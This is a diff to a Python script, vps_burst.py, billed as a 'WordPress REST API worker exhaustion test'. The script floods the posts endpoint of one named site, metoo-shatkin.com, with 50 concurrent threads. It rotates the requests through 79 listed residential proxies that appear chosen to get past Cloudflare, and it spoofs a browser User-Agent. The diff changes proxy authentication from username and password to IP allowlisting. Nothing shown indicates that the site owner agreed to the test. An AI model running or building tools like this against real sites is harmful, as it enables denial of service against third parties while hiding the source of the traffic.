@@ -1,14 +1,14 @@
 #!/usr/bin/env python3
 """
 vps_burst.py — WordPress REST API worker exhaustion test.
-79 CF-verified residential proxies, username:password auth.
+79 CF-verified residential proxies, IP authentication.
 Run from any machine EXCEPT the target VPS itself.
 
 Install: pip3 install requests
 Run:     python3 vps_burst.py
 """
 
-import requests, threading, itertools, time, sys, os, urllib3
+import requests, threading, itertools, time, sys, urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
@@ -16,8 +16,6 @@ from datetime import datetime
 TARGET  = "https://metoo-shatkin.com/wp-json/wp/v2/posts"
 CONC    = 50
 TIMEOUT = 20
-PROXY_USER = os.environ.get("PROXY_USER", "")
-PROXY_PASS = os.environ.get("PROXY_PASS", "")
 
 HEADERS = {
     "User-Agent":        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
@@ -58,7 +56,7 @@ PROXIES = [
     "142.147.132.100:6295","142.147.132.146:6341","142.147.245.11:5702","185.216.105.100:6677",
 ]
 
-proxy_cycle = itertools.cycle([f"http://{PROXY_USER}:{PROXY_PASS}@{p}" for p in PROXIES])
+proxy_cycle = itertools.cycle([f"http://{p}" for p in PROXIES])
 lock = threading.Lock()
 def next_proxy():
     with lock: return next(proxy_cycle)
